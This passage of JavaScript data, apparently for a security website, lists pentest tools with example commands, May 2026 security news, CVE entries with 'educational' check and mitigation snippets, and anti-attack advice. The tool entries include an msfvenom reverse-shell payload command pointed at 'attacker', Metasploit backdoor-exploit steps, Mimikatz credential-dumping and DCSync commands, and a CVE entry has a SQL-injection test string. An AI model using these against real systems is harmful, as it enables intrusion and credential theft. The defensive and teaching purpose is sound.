systems."},{name:"Snort",icon:"&#128031;",cat:"network",catL:"Intrusion Detection",tags:["free","opensource","linux"],desc:"World's most deployed network intrusion detection system. Real-time traffic analysis and packet logging. Detects port scans, buffer overflows, CGI attacks, OS fingerprinting.",install:"snort -dev -i eth0\nsnort -c /etc/snort/snort.conf -i eth0 -A console\nsnort -dev -l /var/log/snort",usage:"sudo apt install snort",detail:"Supports Sniffer, Packet Logger, and Network IDS modes. 4000+ community rules from Snort.org."},{name:"Lynis",icon:"&#128269;",cat:"scan",catL:"System Audit",tags:["free","opensource","linux"],desc:"Security auditing and hardening tool for Unix/Linux. Deep security scans, configuration checks, file permissions, and hardening recommendations for compliance.",install:"lynis audit system\nlynis audit --quick\nlynis show details AUTH-9268",usage:"sudo apt install lynis",detail:"Tests 300+ security controls. Ideal for PCI-DSS, HIPAA, ISO27001 compliance checking and system hardening."},{name:"Metasploit",icon:"&#128163;",cat:"exploit",catL:"Exploitation",tags:["free","opensource","linux","kali"],desc:"World's most used penetration testing framework on Linux/Debian. Full exploit development, payload generation, post-exploitation for authorized security assessments.",install:"msfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.100\nrun\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f elf > payload.elf",usage:"curl -fsSL https://apt.metasploit.com/setup-metasploit-framework | sudo bash",detail:"2200+ exploits, 3500+ modules. Supports staged/stageless payloads and custom encoders."}],windows:[{name:"Nmap for Windows",icon:"&#128301;",cat:"recon",catL:"Reconnaissance",tags:["free","opensource","windows"],desc:"Full Nmap port scanning for Windows. Includes Zenmap GUI. Install via chocolatey or the official installer. Same scanning capability as the Linux version.",install:"nmap -sV -p- target.com\nnmap -A --script=vuln target.com",usage:"choco install nmap  OR download from nmap.org",detail:"Works natively on Windows. Zenmap provides a GUI for visual network mapping."},{name:"Wireshark",icon:"&#128225;",cat:"network",catL:"Network Analysis",tags:["free","opensource","windows"],desc:"Packet capture and protocol analysis on Windows. Uses Npcap driver for native capture. Analyze HTTP, DNS, TLS and 3000+ other protocols in real time.",install:"wireshark.exe\ntshark.exe -i Ethernet -w capture.pcap\ntshark.exe -r capture.pcap -Y http",usage:"Download from wireshark.org  OR: choco install wireshark",detail:"Full GUI application. USBPcap support for USB capture. Integrates with Npcap for best performance."},{name:"Sysinternals Suite",icon:"&#128312;",cat:"forensics",catL:"System Internals",tags:["free","windows"],desc:"Microsoft's legendary suite: Process Explorer, Autoruns, TCPView, PsExec and 70+ tools for deep Windows system inspection. Essential for malware analysis and incident response.",install:"# Process Explorer:\nProcexp64.exe\n# Autoruns - startup items:\nAutoruns64.exe\n# TCPView - live connections:\nTCPView.exe",usage:"Download from learn.microsoft.com/sysinternals",detail:"Autoruns detects persistence mechanisms. TCPView shows all active connections. Essential for any Windows security professional."},{name:"Mimikatz",icon:"&#128049;",cat:"password",catL:"Credential Harvesting",tags:["free","opensource","windows"],desc:"Extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from Windows memory. Used in authorized penetration tests to demonstrate credential harvesting risks.",install:"mimikatz.exe\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::dcsync /domain:target.com /user:Administrator",usage:"Download from github.com/gentilkiwi/mimikatz",detail:"Requires admin/SYSTEM privileges. Demonstrates why LSASS protection and Credential Guard are critical defenses."},{name:"Ghidra",icon:"&#128300;",cat:"forensics",catL:"Reverse Engineering",tags:["free","opensource","windows","linux","mac"],desc:"NSA open-source reverse engineering framework. Disassemble, decompile, and analyze compiled code for malware analysis, CTF challenges, and vulnerability research.",install:"ghidraRun.bat\n# Headless analysis:\nanalyzeHeadless.bat /tmp project -import malware.exe",usage:"Download from ghidra-sre.org",detail:"Supports 40+ processor architectures. Collaborative analysis via shared projects. Java-based extensible plugin system."},{name:"WinPEAS",icon:"&#128203;",cat:"exploit",catL:"Privilege Escalation",tags:["free","opensource","windows"],desc:"Windows Privilege Escalation Awesome Script. Automatically enumerates all PE paths: registry misconfig, unquoted paths, weak service permissions, stored credentials.",install:"winPEASany.exe\nwinPEASany.exe notcolor\nwinPEASany.exe servicesinfo",usage:"Download from github.com/carlospolop/PEASS-ng/releases",detail:"Color coding: Red = high probability PE vector, Yellow = interesting info, Green = verified paths."}],mac:[{name:"Homebrew Security",icon:"&#127866;",cat:"recon",catL:"Package Manager",tags:["free","opensource","mac"],desc:"Essential package manager for macOS security tools. Install Nmap, SQLMap, Aircrack-ng, Hydra and most security tools via brew. Foundation for macOS pentesting setup.",install:"brew install nmap\nbrew install sqlmap\nbrew install aircrack-ng\nbrew install hydra\nbrew install hashcat",usage:"/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",detail:"5000+ packages available. Installs to /opt/homebrew on Apple Silicon, /usr/local on Intel."},{name:"OWASP ZAP",icon:"&#9889;",cat:"web",catL:"Web Scanner",tags:["free","opensource","mac","windows","linux"],desc:"OWASP flagship web application security scanner. Intercepting proxy, active and passive scanner, spider, fuzzer. Full-featured on macOS. REST API for automation in CI/CD.",install:"zap.sh -daemon -port 8080\nzap-cli quick-scan http://target.com\nzap-cli active-scan http://target.com",usage:"brew install --cask owasp-zap",detail:"ZAP HUD overlay works in any browser. API allows full automation in CI/CD pipelines."},{name:"Nmap macOS",icon:"&#128301;",cat:"recon",catL:"Network Scanner",tags:["free","opensource","mac"],desc:"Full Nmap port scanner on macOS including Zenmap GUI. Install via Homebrew or official dmg. All scan types supported. May require sudo for SYN scan.",install:"nmap -sV -A target.com\nsudo nmap -sS -p- target.com\nnmap --script http-title target.com",usage:"brew install nmap",detail:"SYN scan and OS detection require sudo on macOS due to raw socket requirements."},{name:"Objective-See Tools",icon:"&#127822;",cat:"forensics",catL:"macOS Security",tags:["free","mac"],desc:"Patrick Wardle's free macOS security tools: BlockBlock, LuLu, KnockKnock, TaskExplorer. Essential for macOS security research and incident response.",install:"/Applications/KnockKnock.app/Contents/MacOS/KnockKnock -json -pretty\n# LuLu: install .pkg from website\n# BlockBlock: monitors persistence in real-time",usage:"Download from objective-see.org",detail:"KnockKnock detects all macOS persistence mechanisms. LuLu is a free open-source macOS application firewall."}],android:[{name:"Termux",icon:"&#128241;",cat:"recon",catL:"Terminal Emulator",tags:["free","opensource","android"],desc:"Powerful terminal emulator for Android. Run bash, Python, Ruby and install security tools via pkg. Run Nmap, SQLMap, Hydra, Metasploit on your Android device.",install:"pkg install nmap\npkg install python\npkg install git\npkg update",usage:"Install from F-Droid (recommended) or Google Play Store",detail:"Supports SSH client and server, Python packages, custom repositories. Full Linux toolchain on Android without root."},{name:"Kali NetHunter",icon:"&#128009;",cat:"exploit",catL:"Full Pentest Suite",tags:["free","opensource","android"],desc:"Full Kali Linux desktop on Android. Run Nmap, Metasploit, Aircrack-ng, Burp Suite from your phone. Includes HID attacks, BadUSB, and MANA evil AP toolkit.",install:"# After NetHunter installation:\nkex\nmsfconsole\nairmon-ng start wlan0\n# NetHunter App: HID Attacks and Bluetooth Arsenal",usage:"Install from kali.org/get-kali/#kali-mobile (requires rooted device)",detail:"Supported on select Pixel, OnePlus, Samsung devices. NetHunter Store provides additional security apps."},{name:"Hackode",icon:"&#128296;",cat:"recon",catL:"Recon Toolkit",tags:["free","android"],desc:"Hacker toolbox for Android. Reconnaissance, Google Hacking, port scanning, ping, traceroute, DNS lookup, Whois, Exploit-DB search - all in one app. No root required.",install:"# In-app tools:\nReconnaissance - enter domain\nScanning - port scan\nGoogle Hacking - pre-built dorks\nNetwork Tools - ping, traceroute, DNS",usage:"Available on Google Play Store - search Hackode",detail:"No root required. Lightweight and fast. Useful for quick recon during field assessments without a laptop."},{name:"ADB Tools",icon:"&#128295;",cat:"forensics",catL:"Android Analysis",tags:["free","opensource","android","windows","linux","mac"],desc:"Android Debug Bridge - essential for Android forensics and security testing. Extract data, install apps, capture logs, run shell commands, backup devices.",install:"adb devices\nadb shell\nadb pull /data/data/com.target.app/databases/ .\nadb logcat > device_log.txt\nadb backup -all -apk -shared backup.ab\nadb shell pm list packages",usage:"sudo apt install adb  OR  brew install android-platform-tools",detail:"Requires USB Debugging enabled on target device. Essential for mobile app bug bounty and forensic investigations."}]};
+TOOLS.all=[];var _seen={};['kali','linux','windows','mac','android'].forEach(function(os){TOOLS[os].forEach(function(t){if(!_seen[t.name]){_seen[t.name]=true;TOOLS.all.push(t);}});});
+
+var NEWS=[{title:"Fog Ransomware Surge: Telecom Infrastructure Under Massive Attack",date:"May 14, 2026",time:"08:30 UTC",badge:"crit",src:"BestAntivirusPro",sum:"Threat actors deploying Fog ransomware at unprecedented scale against unpatched telecom servers. Automated exploitation engines combined with remote access trojans have compromised dozens of providers worldwide."},{title:"GemStuffer: 150+ Malicious RubyGems Push Data Exfiltration",date:"May 13, 2026",time:"14:22 UTC",badge:"high",src:"The Hacker News",sum:"Supply chain attack placing 150+ malicious gems in the RubyGems repository. Packages use the registry as a covert data exfiltration channel."},{title:"CVE-2026-32185: Microsoft Teams for Android Spoofing Flaw",date:"May 12, 2026",time:"10:15 UTC",badge:"high",src:"Cybersecurity News",sum:"Microsoft disclosed a spoofing vulnerability in Teams for Android. Files accessible to external parties enable attackers to impersonate legitimate communications. CVSS 5.5. Patch build 1.0.0.2026092103 released."},{title:"Instructure Canvas Cyberattack Disrupts Global University Exams",date:"May 7, 2026",time:"09:00 UTC",badge:"crit",src:"Boston Institute of Analytics",sum:"A major cyberattack against Instructure Canvas learning management system disrupted educational institutions worldwide during critical exam periods."},{title:"May 2026 Patch Tuesday: 132 CVEs Including 14 Critical CVSS 9.0+",date:"May 13, 2026",time:"18:00 UTC",badge:"crit",src:"Sophos",sum:"Microsoft May Patch Tuesday addresses 132 CVEs. 14 with CVSS 9.0 or higher. Key patches: CVE-2026-41089 Windows Netlogon RCE, CVE-2026-40361 Word RCE exploitable via Preview Pane."},{title:"AI-Powered Phishing Campaigns Reach New Sophistication Levels",date:"May 10, 2026",time:"11:45 UTC",badge:"high",src:"SecurityWeek",sum:"Threat actors leveraging frontier AI models to craft hyper-personalized phishing lures bypassing traditional filters. AI-generated BEC attacks increased 340% in Q1 2026."},{title:"March 2026: 139% Spike in High-Impact Vulnerabilities",date:"Apr 13, 2026",time:"16:30 UTC",badge:"crit",src:"Recorded Future",sum:"Insikt Group identified 31 vulnerabilities requiring immediate remediation in March 2026 up from 13 in February - a 139% increase."},{title:"Frontier AI Models Now Capable of Finding Novel Vulnerabilities",date:"May 13, 2026",time:"08:00 UTC",badge:"med",src:"Palo Alto Networks",sum:"New research shows frontier AI models are exceptionally capable at evaluating security exposures and understanding misconfigurations."},{title:"cPanel Authentication Bypass CVE-2026-41940 Used in Ransomware",date:"Apr 30, 2026",time:"13:00 UTC",badge:"crit",src:"CISA KEV Catalog",sum:"CISA added CVE-2026-41940 - critical authentication bypass in cPanel and WHM - to its Known Exploited Vulnerabilities catalog."},{title:"South Korea Launches National Initiative Against AI Cyberattacks",date:"May 12, 2026",time:"07:30 UTC",badge:"info",src:"Hipther Security",sum:"South Korean cybersecurity agencies announced a coordinated national initiative to develop AI-based countermeasures against AI-powered attacks."},{title:"BerriAI LiteLLM SQL Injection CVE-2026-42208 Added to CISA KEV",date:"May 8, 2026",time:"15:00 UTC",badge:"high",src:"CISA",sum:"LiteLLM proxy SQL injection vulnerability allows reading and modifying the proxy database leading to exposure of all AI API keys managed by the proxy."},{title:"Exaforce Raises 200M for AI-Driven SOC Automation Platform",date:"May 13, 2026",time:"12:00 UTC",badge:"info",src:"SecurityWeek",sum:"Cybersecurity firm Exaforce has raised 200 million dollars in total funding for its AI-driven Security Operations Center automation platform."}];
+
+var CVES=[{id:"CVE-2026-41089",title:"Windows Netlogon Remote Code Execution",sev:"CRITICAL",cvss:"9.8",prod:"Microsoft Windows",vendor:"Microsoft",pub:"May 13, 2026",cwe:"CWE-94",vector:"Network",auth:"None Required",desc:"A critical RCE vulnerability in the Windows Netlogon Remote Protocol allows unauthorized remote attackers to execute arbitrary code. Improper validation in the Netlogon protocol allows specially crafted packets to compromise domain controllers.",impact:"Full system compromise including Domain Controller takeover. Can affect all Windows systems on the same domain.",fix:"Apply Microsoft May 2026 Patch Tuesday update immediately. Block Netlogon traffic from untrusted sources at the firewall.",expl:"# CVE-2026-41089 - Windows Netlogon RCE (Educational)\n# SEVERITY: CRITICAL CVSS 9.8\n\n# Step 1: Identify domain controllers\nnmap -p 445,135,389 --script smb-security-mode TARGET\n\n# Step 2: Check Netlogon availability\nrpcclient -U '' DC_IP -c 'srvinfo'\n\n# Step 3: Verify patch status\n# Check Windows Update for KB5058405 (May 2026)\n\n# NEVER run against systems without authorization",tags:["RCE","WINDOWS","DOMAIN-CONTROLLER","CRITICAL"],refs:["https://nvd.nist.gov","https://www.sophos.com"]},{id:"CVE-2026-40361",title:"Microsoft Word RCE via Preview Pane",sev:"CRITICAL",cvss:"9.8",prod:"Microsoft Word and Office",vendor:"Microsoft",pub:"May 13, 2026",cwe:"CWE-502",vector:"Email/File",auth:"None - User Opens File",desc:"Critical RCE in Microsoft Word executes code through the Windows Preview Pane without the user opening the file. Malicious Office documents execute payloads when previewed in Windows Explorer.",impact:"Arbitrary code execution in the context of the logged-in user. Preview-pane exploitation means no user action beyond receiving an email may be required.",fix:"Apply May 2026 Patch Tuesday. Disable Preview Pane in Windows Explorer as a temporary mitigation.",expl:"# CVE-2026-40361 - Word RCE Preview Pane (Educational)\n# CRITICAL - NO USER INTERACTION REQUIRED\n\n# Temporary mitigation if unpatched:\n# Windows Explorer > View > Show > Preview Pane > DISABLE\n\n# Detection:\n# Monitor for WINWORD.EXE spawning child processes\n# Alert on: cmd.exe, powershell.exe as children of WINWORD.EXE",tags:["RCE","WINDOWS","OFFICE","CRITICAL","PREVIEW-PANE"],refs:["https://nvd.nist.gov","https://www.sophos.com"]},{id:"CVE-2026-20131",title:"Cisco Secure FMC Deserialization RCE - Actively Exploited",sev:"CRITICAL",cvss:"9.8",prod:"Cisco Secure Firewall Management Center",vendor:"Cisco",pub:"March 18, 2026",cwe:"CWE-502",vector:"Network",auth:"Unauthenticated",desc:"Critical deserialization of untrusted data in Cisco Secure FMC allows unauthenticated remote attackers to execute arbitrary Java code as root. Actively exploited by the Interlock ransomware group.",impact:"Full root-level code execution on the firewall management server. Exploitation effectively disables all network security controls.",fix:"Apply Cisco patch immediately. Restrict FMC management interface to trusted IPs only.",expl:"# CVE-2026-20131 - Cisco FMC Deserialization RCE (Educational)\n# ACTIVELY EXPLOITED BY INTERLOCK RANSOMWARE\n\n# Step 1: Identify Cisco FMC instances\nnmap -sV -p 443,8305 TARGET_RANGE\n\n# Step 2: Check version\ncurl -k https://FMC_IP/api/fmc_platform/v1/info/serverversion\n# Vulnerable versions: Below 7.8.1 patch level\n\n# Immediate mitigation:\n# iptables -A INPUT -p tcp --dport 443 -s TRUSTED_SUBNET -j ACCEPT\n# iptables -A INPUT -p tcp --dport 443 -j DROP",tags:["RCE","CISCO","DESERIALIZATION","CRITICAL","ACTIVELY-EXPLOITED"],refs:["https://www.recordedfuture.com","https://nvd.nist.gov"]},{id:"CVE-2026-41940",title:"cPanel and WHM Authentication Bypass",sev:"CRITICAL",cvss:"9.8",prod:"cPanel and WHM",vendor:"WebPros",pub:"April 28, 2026",cwe:"CWE-306",vector:"Network",auth:"Unauthenticated",desc:"Authentication bypass in cPanel/WHM allows unauthenticated attackers to gain unauthorized access. Actively used in ransomware campaigns.",impact:"Unauthenticated attackers gain full cPanel/WHM access enabling file system access, database management, and malware deployment.",fix:"Update immediately. Restrict ports 2082/2083/2086/2087 to trusted IPs only.",expl:"# CVE-2026-41940 - cPanel Authentication Bypass (Educational)\n# ACTIVE RANSOMWARE VECTOR - CISA KEV CATALOG\n\n# Step 1: Identify cPanel instances\nnmap -p 2082,2083,2086,2087 TARGET_RANGE\n\n# Step 2: Check version\ncurl -k https://TARGET:2083/login/?login_only=1 -I\n\n# Detection:\n# Monitor cPanel access logs for anomalous session tokens",tags:["AUTH-BYPASS","CPANEL","CRITICAL","RANSOMWARE","CISA-KEV"],refs:["https://www.cisa.gov/known-exploited-vulnerabilities-catalog","https://support.cpanel.net"]},{id:"CVE-2026-42208",title:"BerriAI LiteLLM SQL Injection via Proxy",sev:"HIGH",cvss:"8.8",prod:"BerriAI LiteLLM",vendor:"BerriAI",pub:"May 8, 2026",cwe:"CWE-89",vector:"Network",auth:"Authenticated",desc:"SQL injection in LiteLLM proxy allows reading and modifying the proxy database. Exploitation exposes all integrated AI service credentials including OpenAI and Anthropic keys.",impact:"Full database read/write access. Exposure of all LLM API keys managed by the proxy.",fix:"Update LiteLLM to latest version.",expl:"# CVE-2026-42208 - LiteLLM SQL Injection (Educational)\n\n# Step 1: Identify LiteLLM instances\ncurl http://TARGET:4000/health\n\n# Step 2: SQL injection test\ncurl -X GET 'http://TARGET:4000/model/info?model_id=1%27%20OR%20%271%27%3D%271'\n  -H 'Authorization: Bearer API_KEY'\n\n# Patch verification:\npip show litellm | grep Version",tags:["SQL-INJECTION","HIGH","AI-INFRASTRUCTURE","LLM"],refs:["https://github.com/BerriAI/litellm/security","https://nvd.nist.gov"]},{id:"CVE-2026-2441",title:"Google Chrome Use-After-Free in CSS - Zero Day",sev:"HIGH",cvss:"8.8",prod:"Google Chrome",vendor:"Google",pub:"February 13, 2026",cwe:"CWE-416",vector:"Network",auth:"User Interaction Required",desc:"High-severity use-after-free in Chrome CSS engine. Google confirmed an exploit exists in the wild at time of disclosure - a zero-day actively exploited.",impact:"Arbitrary code execution in the browser renderer process. Triggered by visiting a malicious webpage.",fix:"Update Chrome immediately to the stable channel build from February 13, 2026 or later.",expl:"# CVE-2026-2441 - Chrome CSS Use-After-Free (Educational)\n# ZERO-DAY - ACTIVE EXPLOITATION CONFIRMED IN THE WILD\n\n# Step 1: Check Chrome version\n# Address bar: chrome://version\n\n# Step 2: Verify auto-update\n# Chrome menu > Help > About Google Chrome\n\n# Detection:\n# chrome://crashes - unusual renderer crash patterns\n# Monitor for Chrome spawning unexpected child processes",tags:["USE-AFTER-FREE","HIGH","CHROME","BROWSER","ZERO-DAY","IN-THE-WILD"],refs:["https://chromereleases.googleblog.com","https://nvd.nist.gov"]},{id:"CVE-2026-39987",title:"Marimo Pre-Auth Remote Code Execution",sev:"CRITICAL",cvss:"9.8",prod:"Marimo Python Notebook",vendor:"Marimo Team",pub:"April 2026",cwe:"CWE-306",vector:"Network",auth:"Unauthenticated",desc:"Marimo reactive Python notebook contains a pre-authorization RCE vulnerability. Unauthenticated attackers gain shell access and can execute arbitrary system commands.",impact:"Full server compromise without credentials. Marimo instances often contain AI API keys, database credentials, and training data.",fix:"Update Marimo to latest version. Bind to localhost only: marimo edit --host 127.0.0.1",expl:"# CVE-2026-39987 - Marimo Pre-Auth RCE (Educational)\n\n# Step 1: Find exposed Marimo instances\nshodan search 'Marimo' port:2718\n\n# Immediate mitigation:\n# marimo edit --host 127.0.0.1 --token YOUR_SECRET_TOKEN\n\n# Patch:\npip install marimo --upgrade",tags:["RCE","CRITICAL","PYTHON","NOTEBOOK","UNAUTHENTICATED","CISA-KEV"],refs:["https://github.com/marimo-team/marimo/security","https://www.cisa.gov/known-exploited-vulnerabilities-catalog"]},{id:"CVE-2026-32185",title:"Microsoft Teams for Android Spoofing",sev:"HIGH",cvss:"5.5",prod:"Microsoft Teams for Android",vendor:"Microsoft",pub:"May 12, 2026",cwe:"CWE-552",vector:"Local",auth:"User Interaction Required",desc:"Teams for Android allows files and directories to be accessible to external parties, creating spoofing opportunities.",impact:"Spoofing attacks allowing malicious content to appear as legitimate Teams messages.",fix:"Update Microsoft Teams to build 1.0.0.2026092103 or later.",expl:"# CVE-2026-32185 - Teams Android Spoofing (Educational)\n\n# Step 1: Check Teams version\nadb shell dumpsys package com.microsoft.teams | grep versionName\n# Patched version: 1.0.0.2026092103\n\n# Mitigation:\n# Update Teams via Google Play Store",tags:["SPOOFING","HIGH","MICROSOFT","ANDROID","TEAMS"],refs:["https://nvd.nist.gov","https://hipther.com"]},{id:"CVE-2026-21513",title:"MSHTML Engine Zone Restriction Bypass",sev:"HIGH",cvss:"8.4",prod:"Windows MSHTML Engine",vendor:"Microsoft",pub:"March 2026",cwe:"CWE-119",vector:"Network",auth:"User Interaction",desc:"Vulnerability in the Internet Explorer MSHTML engine bypasses rules restricting execution of files from untrusted network sources. Exploited in Q1 2026 by APT groups.",impact:"Code execution bypassing Protected View and Zone Identifier restrictions. Used in APT campaigns against corporate targets.",fix:"Apply Microsoft March and May 2026 cumulative patches.",expl:"# CVE-2026-21513 - MSHTML Zone Bypass (Educational)\n\n# Check Zone.Identifier on downloaded file:\npowershell Get-Item downloaded_file.docx -Stream Zone.Identifier\n\n# Enable Network Protection:\npowershell Set-MpPreference -EnableNetworkProtection Enabled",tags:["RCE","HIGH","WINDOWS","MSHTML","APT","BYPASS"],refs:["https://securelist.com","https://nvd.nist.gov"]},{id:"CVE-2026-41103",title:"Microsoft SSO Plugin for Jira - Privilege Escalation",sev:"CRITICAL",cvss:"9.1",prod:"Microsoft SSO Plugin for Jira and Confluence",vendor:"Microsoft",pub:"May 13, 2026",cwe:"CWE-303",vector:"Network",auth:"Authenticated",desc:"Incorrect implementation of an authentication algorithm in the Microsoft SSO Plugin for Jira and Confluence allows attackers to bypass authentication and sign in as any valid user including administrators.",impact:"Full authentication bypass enabling sign-in as any enterprise user. Exposes all Jira projects, tickets, source code, and Confluence documentation.",fix:"Apply May 2026 Patch Tuesday update for the SSO plugin immediately.",expl:"# CVE-2026-41103 - SSO Authentication Bypass (Educational)\n\n# Step 1: Identify Jira with Microsoft SSO\ncurl -I https://jira.target.com/login.jsp\n\n# Step 2: Test using SAMLRaider Burp extension\n# 1. Intercept SAML SSO flow in Burp Suite\n# 2. Modify NameID to target admin username\n# 3. Forward modified assertion\n\n# Remediation: Update SSO plugin to patched version",tags:["AUTH-BYPASS","CRITICAL","SSO","JIRA","CONFLUENCE","SAML"],refs:["https://nvd.nist.gov","https://www.sophos.com"]},{id:"CVE-2026-20963",title:"Langflow AI Platform Pre-Auth RCE",sev:"CRITICAL",cvss:"9.8",prod:"Langflow LangChain Visual Builder",vendor:"Datastax",pub:"March 2026",cwe:"CWE-95",vector:"Network",auth:"Unauthenticated",desc:"Langflow visual AI workflow builder contains a critical RCE in its code execution endpoint. Unauthenticated attackers execute arbitrary Python code. Actively exploited in March 2026.",impact:"Full server compromise without credentials. Exposes AI API keys, database credentials, and connected data sources.",fix:"Update Langflow immediately. Bind to localhost and require authentication for all instances.",expl:"# CVE-2026-20963 - Langflow RCE (Educational)\n# ACTIVELY EXPLOITED MARCH 2026\n\n# Find exposed instances:\nnmap -p 7860 --script http-title TARGET_RANGE\n\n# Immediate mitigation:\n# Block port 7860 at firewall\n# iptables -A INPUT -p tcp --dport 7860 -j DROP\n\n# Patch:\npip install langflow --upgrade",tags:["RCE","CRITICAL","AI-PLATFORM","LANGCHAIN","ACTIVELY-EXPLOITED"],refs:["https://www.recordedfuture.com","https://nvd.nist.gov"]},{id:"CVE-2026-21385",title:"Qualcomm Chipset - Limited Targeted Exploitation",sev:"HIGH",cvss:"7.8",prod:"Qualcomm Chipsets - Multiple Android Devices",vendor:"Qualcomm",pub:"March 2026",cwe:"CWE-787",vector:"Local",auth:"None",desc:"Qualcomm chipset vulnerability with confirmed limited targeted exploitation per Google March 2026 Android Security Bulletin. Out-of-bounds write in kernel driver affecting hundreds of millions of Android devices.",impact:"Potential privilege escalation at chipset level. Seen in targeted attacks against high-value individuals.",fix:"Apply March 2026 Android Security Bulletin patches. Contact OEM for device-specific updates.",expl:"# CVE-2026-21385 - Qualcomm Chipset Vulnerability (Educational)\n\n# Check Android security patch level:\nadb shell getprop ro.build.version.security_patch\n# Patched if: 2026-03-01 or later\n\n# Mitigation if unpatched:\n# Only install apps from verified Google Play sources\n# Enable Google Play Protect scanning",tags:["HIGH","QUALCOMM","ANDROID","CHIPSET","CISA-KEV","TARGETED"],refs:["https://www.cisa.gov/known-exploited-vulnerabilities-catalog","https://nvd.nist.gov"]}];
+
+var PREVENTION={mobile:[{name:"Phishing and Smishing Attacks",icon:"&#127907;",bg:"rgba(255,45,120,.1)",sev:90,steps:["Never tap links in unsolicited SMS, WhatsApp, or emails claiming to be from banks, delivery services, or government agencies","Verify sender identity by calling the official number - not a number provided in the suspicious message","Enable 2FA with authenticator apps like Authy or Google Authenticator rather than SMS - SIM swapping can intercept SMS 2FA","Check URLs carefully for typosquatting like paypa1.com before entering any credentials","Install a mobile antivirus with real-time URL scanning such as Malwarebytes or Lookout","Report suspicious messages to your carrier by forwarding to 7726 which spells SPAM"]},{name:"Malicious APK and App Store Attacks",icon:"&#128230;",bg:"rgba(255,200,60,.1)",sev:85,steps:["Only install apps from official stores Google Play or Apple App Store - sideloading from unknown sources is the number one mobile malware vector","Review app permissions before installing - a flashlight app should never request camera or microphone access","Keep your OS and apps updated - most mobile malware exploits known vulnerabilities in outdated systems","Enable Google Play Protect on Android or App Tracking Transparency on iOS","Avoid granting Accessibility Service permissions to apps - heavily abused by banking trojans and spyware","Regularly audit installed apps and remove any you do not recognize or no longer use"]},{name:"WiFi Eavesdropping and MITM",icon:"&#128225;",bg:"rgba(0,212,255,.1)",sev:80,steps:["Always use a VPN on public WiFi at hotels, airports, and cafes - your traffic is visible to anyone on the same network","Disable auto-connect to WiFi networks - attackers create evil twin access points","Enable HTTPS-only mode in your browser to prevent downgrade attacks","Prefer cellular data over untrusted WiFi for banking and sensitive transactions","Check your router connected device list regularly for unknown devices","Use DNS-over-HTTPS to prevent DNS hijacking on compromised public networks"]},{name:"Payload and Exploit Delivery",icon:"&#128163;",bg:"rgba(255,45,120,.1)",sev:88,steps:["Keep OS updated - Q1 2026 saw multiple actively exploited mobile zero-days including CVE-2026-21385 Qualcomm chipset","Enable automatic security updates in Settings then System then System Update","Disable developer options and USB debugging unless actively needed","Enable lockscreen with strong PIN or biometrics - short 4-digit PINs can be brute-forced in minutes","Encrypt your device storage which is enabled by default on modern Android and iOS","Use firewall apps to monitor and block unexpected outbound connections"]},{name:"SIM Swapping and Account Takeover",icon:"&#128242;",bg:"rgba(168,85,247,.1)",sev:75,steps:["Contact your carrier to add a SIM PIN or port freeze - prevents unauthorized SIM transfers","Never use SMS as your only 2FA factor - use hardware keys or TOTP authenticator apps","Use unique complex passwords for every account via a password manager such as Bitwarden","Monitor HaveIBeenPwned.com for your email appearing in data breaches","Enable login notifications for banking and email accounts","Freeze your credit with all three bureaus to prevent identity theft following a SIM swap"]}],computer:[{name:"Ransomware Attacks",icon:"&#128274;",bg:"rgba(255,45,120,.1)",sev:95,steps:["Maintain the 3-2-1 backup rule: 3 copies, 2 different media types, 1 offsite or offline","Never open email attachments from unknown senders - May 2026 Fog ransomware spreads via corrupted PDF attachments","Keep Windows Defender and all security software updated daily","Enable Windows Controlled Folder Access to protect Documents and Desktop folders","Patch systems promptly - unpatched servers were the primary ransomware vector in May 2026","Segment your network so ransomware cannot spread from one PC to domain controllers","Enable SMBv3 signing and disable SMBv1 entirely to block lateral movement"]},{name:"Malware and Trojan Infiltration",icon:"&#129440;",bg:"rgba(255,200,60,.1)",sev:85,steps:["Run Windows Defender with Real-time Protection always enabled","Enable UAC at maximum level and never run your daily account as Administrator","Use a standard non-admin user account for daily tasks to limit blast radius if infected","Enable Windows SmartScreen under Settings then Windows Security","Use software restriction policies or AppLocker to whitelist only trusted applications","Regularly scan with Malwarebytes as a second-opinion scanner","Check startup items with Autoruns from Sysinternals"]},{name:"Credential Theft and Keylogging",icon:"&#128273;",bg:"rgba(0,212,255,.1)",sev:90,steps:["Enable Windows Credential Guard and Device Guard to protect LSASS from Mimikatz-style attacks","Use a password manager - never type passwords manually on untrusted systems","Enable MFA on every account - even if passwords are stolen, attackers are blocked","Check running processes with Process Explorer from Sysinternals for suspicious entries","Regularly review Windows Event Log for Event ID 4624 and 4672 for anomalies","Use unique passwords per site - credential stuffing uses breached passwords from one site against many"]},{name:"Exploit and Drive-By Downloads",icon:"&#128187;",bg:"rgba(127,255,0,.1)",sev:80,steps:["Keep all browsers and plugins updated - Chrome CVE-2026-2441 was a zero-day exploited in February 2026","Use an ad blocker like uBlock Origin - malvertising is a primary drive-by download vector","Enable Enhanced Protected Mode in Edge and sandboxed mode in Chrome","Use Windows Exploit Protection under Windows Security","Consider Microsoft Defender Application Guard for browsing in a Hyper-V container","Disable or sandbox legacy browser plugins"]}],laptop:[{name:"Physical Theft and Cold Boot Attacks",icon:"&#128272;",bg:"rgba(255,45,120,.1)",sev:90,steps:["Enable full-disk encryption with BitLocker on Windows Pro or FileVault on macOS","Set a BIOS or UEFI password and disable boot from USB","Enable TPM-backed BitLocker so the drive cannot be accessed if removed from hardware","Use a cable lock in public spaces","Configure auto-lock after 2 minutes of inactivity","Enable Find My Device on Windows or Find My on macOS with remote wipe capability"]},{name:"Evil Maid and USB Attacks",icon:"&#128268;",bg:"rgba(255,200,60,.1)",sev:78,steps:["Disable USB auto-run in Windows Group Policy","Never plug in found USB drives - USB drop attacks rely on human curiosity","Use USB port blockers when leaving a device unattended","Enable Secure Boot to detect offline tampering with bootloader files","Consider tamper-evident seals to detect physical access","Use BitLocker with TPM plus PIN so machine will not boot without both"]},{name:"Rogue Access Points and SSL Stripping",icon:"&#128246;",bg:"rgba(0,212,255,.1)",sev:82,steps:["Always use a corporate VPN when connecting from untrusted networks","Enable HTTPS Everywhere or HTTPS-only mode","Verify SSL certificates for banking and sensitive sites","Disable WiFi when not in use to prevent automatic connection to rogue APs","Use your phone's mobile hotspot instead of public WiFi for sensitive work","Use a privacy screen filter to prevent visual shoulder-surfing in public"]}],server:[{name:"Remote Code Execution and Unauth 